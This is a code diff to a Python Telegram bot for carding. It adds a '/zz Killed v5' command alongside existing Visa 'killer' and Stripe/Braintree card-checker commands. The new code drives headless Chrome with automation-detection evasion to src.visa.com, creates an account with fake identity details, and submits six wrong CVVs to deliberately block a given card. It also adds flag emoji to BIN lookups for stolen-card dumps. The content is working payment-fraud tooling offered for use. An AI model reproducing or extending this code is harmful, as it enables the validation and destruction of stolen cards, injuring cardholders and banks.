@@ -58,7 +58,7 @@ start_time = datetime.now()
 USER_DB_FILE = "users.json"
 
 # Commands we gate
-CMD_KEYS = ("bin", "kill", "kd", "ko", "st", "bt", "au", "sort", "chk", "clean", "num", "adhar")
+CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "st", "bt", "au", "sort", "chk", "clean", "num", "adhar")
 
 # Per-command approvals, plus a legacy/global "all" set
 approved_cmds = {k: set() for k in CMD_KEYS}
@@ -317,7 +317,7 @@ def get_bin_info(bin_number):
             if type_ and type_ != "UNKNOWN": 
                 info_parts.append(type_)
             if country and country != "Unknown":
-                info_parts.append(f"{country_flag} {country}")
+                info_parts.append(country)
             if level and level != "":
                 info_parts.append(level)
             if bank and bank != "Unknown":
@@ -387,7 +387,7 @@ def get_bin_info(bin_number):
             if type_ and type_ != "UNKNOWN": 
                 info_parts.append(type_)
             if country and country != "Unknown":
-                info_parts.append(f"{country_flag} {country}")
+                info_parts.append(country)
             if level and level != "":
                 info_parts.append(level)
             if bank and bank != "Unknown":
@@ -1210,7 +1210,8 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🗡️ *Visa Killer Commands:*\n"
         "• /kill <card> - VISA Killer\n"
         "• /kd <card> - VISA Killer #2\n"
-        "• /ko <card> - VISA Killer #3\n\n"
+        "• /ko <card> - VISA Killer #3\n"
+        "• /zz <card> - Killed v5 (fast)\n\n"
         "🔧 *Data Processing:*\n"
         "• /clean <data|file> - Advanced card cleaner\n"
         "• /sort <data|file> - Clean & sort cards\n"
@@ -1389,6 +1390,7 @@ async def cmds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lock("/kill <card> — VISA Killer", "kill"),
         lock("/kd <card> — VISA Killer #2", "kd"),
         lock("/ko <card> — VISA Killer #3", "ko"),
+        lock("/zz <card> — Killed v5 (fast)", "zz"),
     ]))
 
     # Data Processing Tools
@@ -2449,7 +2451,7 @@ async def show_bin_details(query, organized_data, bin_num, session_id):
         f"🔢 BIN Details\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"BIN: {bin_num}\n"
-        f"Info: {sample_card['bin_info']}\n"
+        f"Info: {sample_card['bin_info']}{(' ' + sample_card.get('country_flag', '')) if sample_card.get('country_flag', '') else ''}\n"
         f"Brand: {sample_card['brand']}\n"
         f"Type: {sample_card['type']}\n"
         f"Country: {sample_card['country_flag']} {sample_card['country']}\n"
@@ -2810,7 +2812,8 @@ async def fill_checkout_form(card_input, update_dict):
 
     card, mm, yy, original_cvv = parsed
     short_card = f"{card}|{mm}|{yy}|{original_cvv}"
-    bin_info, _ = get_bin_info(card[:6])
+    bin_info, bin_details = get_bin_info(card[:6])
+    bin_flag = (bin_details or {}).get("country_flag", "")
 
     await bot.edit_message_text(
         chat_id=chat_id,
@@ -2903,7 +2906,7 @@ async def fill_checkout_form(card_input, update_dict):
             message_id=msg_id,
             text=(
                 f"💳 **Card:** `{short_card}`\n"
-                f"🏦 **BIN:** `{bin_info}`\n\n"
+                f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
                 f"🔁 **CVV Attempts:**\n" + "\n".join(logs) + "\n\n"
                 f"✅ **Status:** Killed Successfully\n"
                 f"⏱ **Time:** {duration}s"
@@ -2973,7 +2976,26 @@ def run_kd_process(card_input, update_dict):
     CHROME_PATH = "/usr/bin/google-chrome"
     CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
     BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-    BOT_ADMIN_ID = int(os.environ.get("BOT_ADMIN_ID", "123456789"))
+
+    def _env_int(name: str, default: int) -> int:
+        raw = os.environ.get(name)
+        if raw is None or str(raw).strip() == "":
+            return default
+        try:
+            return int(str(raw).strip())
+        except Exception:
+            return default
+
+    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)
+
+    def _flag_from_country_code(code: str) -> str:
+        code = (code or "").strip().upper()
+        if len(code) != 2 or not code.isalpha():
+            return ""
+        try:
+            return "".join(chr(ord(c) + 127397) for c in code)
+        except Exception:
+            return ""
 
     def split_card(card_input):
         parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
@@ -2989,6 +3011,8 @@ def run_kd_process(card_input, update_dict):
                 brand = data.get("brand", "Unknown").upper()
                 type_ = data.get("type", "Unknown").upper()
                 country = data.get("country_name", "Unknown")
+                country_code = data.get("country", "") or data.get("country_code", "")
+                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
                 bank = data.get("bank", "Unknown")
                 level = data.get("level", "")
                 
@@ -3002,10 +3026,10 @@ def run_kd_process(card_input, update_dict):
                 if bank and bank != "Unknown":
                     info_parts.append(bank)
                     
-                return " • ".join(info_parts)
+                return " • ".join(info_parts), country_flag
         except:
             pass
-        return "Unavailable"
+        return "Unavailable", ""
 
     def get_random_email():
         return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"
@@ -3111,7 +3135,7 @@ def run_kd_process(card_input, update_dict):
         edit_message("🔓 1 - Login (Unlocked)\n⚙️ 2 - Card Fill...")
 
         cc, mm, yy, real_cvv = split_card(card_input)
-        bin_info = get_bin_info_local(cc[:6])
+        bin_info, bin_flag = get_bin_info_local(cc[:6])
         short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
         wrong_cvv = get_wrong_cvv(real_cvv)
 
@@ -3181,7 +3205,7 @@ def run_kd_process(card_input, update_dict):
         tries_txt = "\n".join([f"• Try {i+1}: {cvv}" for i, cvv in enumerate(cvv_results)])
         edit_message(
             f"💳 **Card:** `{short_card}`\n"
-            f"🏦 **BIN:** `{bin_info}`\n\n"
+            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
             f"🔁 **CVV Attempts:**\n{tries_txt}\n\n"
             f"✅ **Status:** Kd KiLLeD SuccessFully\n"
             f"⏱ **Time:** {duration}s"
@@ -3234,7 +3258,26 @@ def run_ko_process(card_input, update_dict):
     CHROME_PATH = "/usr/bin/google-chrome"
     CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
     BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-    BOT_ADMIN_ID = int(os.environ.get("BOT_ADMIN_ID", "123456789"))
+
+    def _env_int(name: str, default: int) -> int:
+        raw = os.environ.get(name)
+        if raw is None or str(raw).strip() == "":
+            return default
+        try:
+            return int(str(raw).strip())
+        except Exception:
+            return default
+
+    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)
+
+    def _flag_from_country_code(code: str) -> str:
+        code = (code or "").strip().upper()
+        if len(code) != 2 or not code.isalpha():
+            return ""
+        try:
+            return "".join(chr(ord(c) + 127397) for c in code)
+        except Exception:
+            return ""
 
     def split_card(card_input):
         parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
@@ -3250,6 +3293,8 @@ def run_ko_process(card_input, update_dict):
                 brand = data.get("brand", "Unknown").upper()
                 type_ = data.get("type", "Unknown").upper()
                 country = data.get("country_name", "Unknown")
+                country_code = data.get("country", "") or data.get("country_code", "")
+                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
                 bank = data.get("bank", "Unknown")
                 level = data.get("level", "")
                 
@@ -3263,10 +3308,10 @@ def run_ko_process(card_input, update_dict):
                 if bank and bank != "Unknown":
                     info_parts.append(bank)
                     
-                return " • ".join(info_parts)
+                return " • ".join(info_parts), country_flag
         except:
             pass
-        return "Unavailable"
+        return "Unavailable", ""
 
     def get_random_email():
         return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"
@@ -3372,7 +3417,7 @@ def run_ko_process(card_input, update_dict):
         edit_message("🔓 1 - Login (Unlocked)\n⚙️ 2 - Card Fill...")
 
         cc, mm, yy, real_cvv = split_card(card_input)
-        bin_info = get_bin_info_local(cc[:6])
+        bin_info, bin_flag = get_bin_info_local(cc[:6])
         short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
         wrong_cvv = get_wrong_cvv(real_cvv)
 
@@ -3442,7 +3487,7 @@ def run_ko_process(card_input, update_dict):
         tries_txt = "\n".join([f"• Try {i+1}: {cvv}" for i, cvv in enumerate(cvv_results)])
         edit_message(
             f"💳 **Card:** `{short_card}`\n"
-            f"🏦 **BIN:** `{bin_info}`\n\n"
+            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
             f"🔁 **CVV Attempts:**\n{tries_txt}\n\n"
             f"✅ **Status:** KO Mode Success\n"
             f"⏱ **Time:** {duration}s"
@@ -3480,6 +3525,291 @@ async def ko_cmd(update, context):
         "message_id": msg.message_id
     }
     Process(target=run_ko_process, args=(card_input, update_dict), daemon=True).start()
+
+# ==== 7.5 /zz Command (Killed v5 — fast KO, 6 total CVV attempts) ==== #
+def run_zz_process(card_input, update_dict):
+    import os, random, traceback, requests, time
+    from selenium import webdriver
+    from selenium.webdriver.chrome.service import Service
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    from selenium.webdriver.common.keys import Keys
+    from fake_useragent import UserAgent
+
+    CHROME_PATH = "/usr/bin/google-chrome"
+    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
+    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+
+    def _env_int(name: str, default: int) -> int:
+        raw = os.environ.get(name)
+        if raw is None or str(raw).strip() == "":
+            return default
+        try:
+            return int(str(raw).strip())
+        except Exception:
+            return default
+
+    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)
+
+    def _flag_from_country_code(code: str) -> str:
+        code = (code or "").strip().upper()
+        if len(code) != 2 or not code.isalpha():
+            return ""
+        try:
+            return "".join(chr(ord(c) + 127397) for c in code)
+        except Exception:
+            return ""
+
+    def split_card(card_input):
+        parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
+        if len(parts) != 4:
+            raise ValueError("Invalid card format")
+        return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]
+
+    def get_bin_info_local(bin_number):
+        try:
+            res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=4)
+            if res.status_code == 200:
+                data = res.json()
+                brand = data.get("brand", "Unknown").upper()
+                type_ = data.get("type", "Unknown").upper()
+                country = data.get("country_name", "Unknown")
+                country_code = data.get("country", "") or data.get("country_code", "")
+                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
+                bank = data.get("bank", "Unknown")
+                level = data.get("level", "")
+
+                info_parts = [brand]
+                if type_ and type_ != "UNKNOWN":
+                    info_parts.append(type_)
+                if country and country != "Unknown":
+                    info_parts.append(country)
+                if level and level != "":
+                    info_parts.append(level)
+                if bank and bank != "Unknown":
+                    info_parts.append(bank)
+
+                return " • ".join(info_parts), country_flag
+        except Exception:
+            pass
+        return "Unavailable", ""
+
+    def get_random_email():
+        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"
+
+    def get_fake_name():
+        first = random.choice(["James", "John", "Robert", "Michael", "David"])
+        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
+        return first, last
+
+    def get_fake_address():
+        return "123 Elm Street", "New York", "NY", "10001", "20255501" + ''.join(random.choices('0123456789', k=2))
+
+    def get_wrong_cvv(exclude):
+        while True:
+            fake = ''.join(random.choices('0123456789', k=3))
+            if fake != exclude:
+                return fake
+
+    def edit_message(text):
+        payload = {
+            "chat_id": update_dict["chat_id"],
+            "message_id": update_dict["message_id"],
+            "text": text,
+            "parse_mode": "Markdown"
+        }
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
+        try:
+            requests.post(url, data=payload, timeout=8)
+        except Exception:
+            pass
+
+    def admin_report(trace, driver=None):
+        sent = False
+        screenshot_path = "zz_fail.png"
+        if driver:
+            try:
+                driver.save_screenshot(screenshot_path)
+                with open(screenshot_path, "rb") as img:
+                    files = {"photo": img}
+                    payload = {
+                        "chat_id": BOT_ADMIN_ID,
+                        "caption": f"ZZ Error:\n```\n{trace[:900]}\n```",
+                        "parse_mode": "Markdown"
+                    }
+                    requests.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                        data=payload,
+                        files=files,
+                        timeout=12
+                    )
+                sent = True
+                os.remove(screenshot_path)
+            except Exception:
+                pass
+        if not sent:
+            try:
+                payload = {
+                    "chat_id": BOT_ADMIN_ID,
+                    "text": f"ZZ Error (no screenshot):\n```\n{trace[:900]}\n```",
+                    "parse_mode": "Markdown"
+                }
+                requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    data=payload,
+                    timeout=8
+                )
+            except Exception:
+                pass
+
+    start = time.time()
+    driver = None
+
+    try:
+        edit_message("⚙️ Processing your request...")
+
+        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
+        options = webdriver.ChromeOptions()
+        options.binary_location = CHROME_PATH
+        options.add_argument(f"user-agent={ua}")
+        options.add_argument("--disable-blink-features=AutomationControlled")
+        options.add_argument("--headless=new")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--window-size=1920,1080")
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option('useAutomationExtension', False)
+        # Faster page loads (good enough for this flow)
+        try:
+            options.set_capability("pageLoadStrategy", "eager")
+        except Exception:
+            pass
+
+        service = Service(executable_path=CHROME_DRIVER_PATH)
+        driver = webdriver.Chrome(service=service, options=options)
+        wait = WebDriverWait(driver, 3)  # faster than /ko
+
+        driver.get("https://src.visa.com/login")
+
+        try:
+            btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".wscrOk")))
+            driver.execute_script("arguments[0].click();", btn)
+        except Exception:
+            pass
+
+        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
+        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]'))).click()
+        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
+        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]'))).click()
+
+        cc, mm, yy, real_cvv = split_card(card_input)
+        bin_info, bin_flag = get_bin_info_local(cc[:6])
+        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
+
+        wrong_cvv = get_wrong_cvv(real_cvv)
+        wait.until(EC.visibility_of_element_located((By.ID, "card-input"))).send_keys(cc)
+        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
+        wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
+
+        # Billing (USA)
+        first_name, last_name = get_fake_name()
+        address, city, state, zip_code, phone = get_fake_address()
+        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(first_name)
+        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(last_name)
+
+        try:
+            country_box = wait.until(
+                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]'))
+            )
+            country_val = country_box.get_attribute('value')
+            if not country_val or ("United States" not in country_val):
+                country_box.click()
+                country_box.clear()
+                country_box.send_keys("United States")
+                wait.until(lambda d: "United States" in country_box.get_attribute('value') or "United States" in country_box.text)
+                country_box.send_keys(Keys.ENTER)
+        except Exception:
+            pass
+
+        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(address)
+        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(city)
+        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(state)
+        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(zip_code)
+        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(phone)
+
+        add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
+        driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
+        add_card_btn.click()
+
+        edit_message("🔄 Updating your request...")
+
+        # Total CVV attempts = 6 (including the initial submit above)
+        TOTAL_TRIES = 6
+        used_cvvs = {wrong_cvv}
+        for _ in range(TOTAL_TRIES - 1):
+            while True:
+                fake_cvv = ''.join(random.choices('0123456789', k=3))
+                if fake_cvv not in used_cvvs:
+                    used_cvvs.add(fake_cvv)
+                    break
+            try:
+                add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
+                cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
+                cvv_field.click()
+                cvv_field.send_keys(Keys.CONTROL + "a")
+                cvv_field.send_keys(fake_cvv)
+                driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
+                add_card_btn.click()
+            except Exception:
+                # Keep going; /zz is meant to be fast & best-effort
+                pass
+
+        duration = round(time.time() - start, 2)
+        edit_message(
+            f"💳 **Card:** `{short_card}`\n"
+            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
+            f"1 Procceed\n"
+            f"2 Processed\n\n"
+            f"✅ **Status:** Killed v5 Success\n"
+            f"⏱ **Time:** {duration}s"
+        )
+
+    except Exception as e:
+        trace = traceback.format_exc()
+        edit_message(f"❌ ZZ Error: `{e}`")
+        admin_report(trace, driver)
+    finally:
+        try:
+            if driver:
+                driver.quit()
+        except Exception:
+            pass
+
+
+async def zz_cmd(update, context):
+    uid = update.effective_user.id
+    if not is_approved(uid, "zz"):
+        await update.message.reply_text("⛔ You are not approved to use /zz", reply_to_message_id=update.message.message_id)
+        return
+
+    if not is_cmd_enabled("zz"):
+        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
+        return
+
+    raw_input = " ".join(context.args) if context.args else ""
+    card_input = extract_card_input(raw_input)
+    if not card_input:
+        await update.message.reply_text("❌ Invalid card.\nUse: `/zz 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
+        return
+
+    msg = await update.message.reply_text("⚙️ Processing your request...", reply_to_message_id=update.message.message_id)
+    update_dict = {
+        "user_id": uid,
+        "chat_id": update.effective_chat.id,
+        "message_id": msg.message_id
+    }
+    Process(target=run_zz_process, args=(card_input, update_dict), daemon=True).start()
 
 # ==== 8. STRIPE AUTH V1 (/st) — Single + Batch Mode ==== #
 def extract_all_card_inputs(raw_text: str):
@@ -3786,7 +4116,8 @@ async def st_single_main(card_input, update_dict):
     expiry = f"{mm}/{yy}"
     full_card = f"{card}|{mm}|20{yy}|{cvv}"
     start_time = time.time()
-    bin_info, _ = get_bin_info(card[:6])
+    bin_info, bin_details = get_bin_info(card[:6])
+    bin_flag = (bin_details or {}).get("country_flag", "")
 
     try:
         ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
@@ -3867,7 +4198,7 @@ async def st_single_main(card_input, update_dict):
                 emoji = "✅" if status == "Approved" else "❌"
                 result_msg = (
                     f"💳 **Card:** `{full_card}`\n"
-                    f"🏦 **BIN:** `{bin_info}`\n"
+                    f"🏦 **BIN:** `{bin_info}` {bin_flag}\n"
                     f"📟 **Status:** {emoji} **{status}**\n"
                     f"📩 **Response:** `{response_text}`\n"
                     f"🔁 **Attempt:** {attempt}/3\n"
@@ -3888,7 +4219,7 @@ async def st_single_main(card_input, update_dict):
                         admin_caption = (
                             "ST Error (after 3 attempts)\n"
                             f"💳 `{full_card}`\n"
-                            f"🏦 `{bin_info}`\n"
+                            f"🏦 `{bin_info}` {bin_flag}\n"
                             f"📩 `{_st_md_safe(str(e))[:320]}`\n"
                             f"🧑‍💻 {username} [`{uid}`]"
                         )
@@ -4302,7 +4633,8 @@ async def _bt_check(card_str, chat_id, message_id):
                 raise Exception("Invalid card format.")
             card, mm, yy, cvv = parts
             exp = f"{mm} / {yy}"
-            bin_info, _ = get_bin_info(card[:6])
+            bin_info, bin_details = get_bin_info(card[:6])
+            bin_flag = (bin_details or {}).get("country_flag", "")
 
             # Braintree iframe: card
             wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-number']")))
@@ -4340,7 +4672,7 @@ async def _bt_check(card_str, chat_id, message_id):
 
             msg = (
                 f"💳 Card: `{full_card}`\n"
-                f"🏦 BIN: `{bin_info}`\n"
+                f"🏦 BIN: `{bin_info}` {bin_flag}\n"
                 f"📟 Status: {status}\n"
                 f"📩 Response: `{result_text}`\n"
                 f"🔁 Attempt: {attempt}/3\n"
@@ -4488,7 +4820,8 @@ async def au_main(card_input, update_dict):
     card, mm, yy, cvv = parsed
     expiry = f"{mm}/{yy}"
     full_card = f"{card}|{mm}|20{yy}|{cvv}"
-    bin_info, _ = get_bin_info(card[:6])
+    bin_info, bin_details = get_bin_info(card[:6])
+    bin_flag = (bin_details or {}).get("country_flag", "")
     temp_profile_dir = tempfile.mkdtemp()
 
     try:
@@ -4602,7 +4935,7 @@ async def au_main(card_input, update_dict):
         emoji = "✅" if status == "Approved" else "❌"
         result_msg = (
             f"💳 **Card:** `{full_card}`\n"
-            f"🏦 **BIN:** `{bin_info}`\n"
+            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n"
             f"📟 **Status:** {emoji} **{status}**\n"
             f"📩 **Response:** `{response_text}`\n"
             f"🌐 **Gateway:** **Stripe-Auth-V2**\n"
@@ -5225,7 +5558,12 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         if not cards:
             # Try to get bin info
             bin_info_str, bin_details = get_bin_info(bin_num)
-            await update.message.reply_text(f"🔍 BIN `{bin_num}` not found in your cleaned data.\n\nInfo: {bin_info_str}", reply_to_message_id=update.message.message_id)
+            flag = (bin_details or {}).get("country_flag", "")
+            info_line = f"Info: {bin_info_str}{(' ' + flag) if flag else ''}"
+            await update.message.reply_text(
+                f"🔍 BIN `{bin_num}` not found in your cleaned data.\n\n{info_line}",
+                reply_to_message_id=update.message.message_id,
+            )
             return
         
         # Create file with cards for this BIN
@@ -5239,10 +5577,17 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
             with BytesIO(file_content.encode('utf-8')) as file_buffer:
                 file_buffer.name = file_name
                 
+                flag = (bin_details or {}).get("country_flag", "")
+                info_line = f"🏦 Info: {bin_info_str}{(' ' + flag) if flag else ''}"
                 await context.bot.send_document(
                     chat_id=update.message.chat.id,
                     document=file_buffer,
-                    caption=f"🔍 BIN: `{bin_num}`\n📁 Cards: {len(cards):,}\n🏦 Info: {bin_info_str}\n👤 User: {session_data['username']}",
+                    caption=(
+                        f"🔍 BIN: `{bin_num}`\n"
+                        f"📁 Cards: {len(cards):,}\n"
+                        f"{info_line}\n"
+                        f"👤 User: {session_data['username']}"
+                    ),
                     reply_to_message_id=update.message.message_id
                 )
         except Exception as e:
@@ -5364,6 +5709,7 @@ async def main():
         app.add_handler(CommandHandler("kill", kill_cmd))
         app.add_handler(CommandHandler("kd", kd_cmd))
         app.add_handler(CommandHandler("ko", ko_cmd))
+        app.add_handler(CommandHandler("zz", zz_cmd))
         app.add_handler(CommandHandler("st", st_cmd))
         app.add_handler(CommandHandler("au", au_cmd))
         app.add_handler(CommandHandler("bt", bt_cmd))
